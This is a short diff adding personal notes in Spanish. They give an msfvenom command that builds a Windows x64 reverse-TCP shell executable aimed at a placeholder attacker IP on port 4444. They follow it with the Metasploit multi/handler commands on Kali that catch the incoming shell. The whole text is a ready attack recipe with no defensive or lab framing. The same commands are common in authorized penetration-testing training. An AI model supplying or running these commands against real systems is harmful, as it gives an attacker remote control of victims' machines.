@@ -1,1 +1,14 @@
+***********para crear el archivo del script **********
+sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip de la maquina atacante} LPORT=4444 -f exe > [nombre del archivo].exe
 
+
+ejecutar en la terminal de  Kali, prepara el receptor profesional:
+
+msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/shell_reverse_tcp
+set LHOST [ip de la maquina atacante ]
+set LPORT 4444
+exploit
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
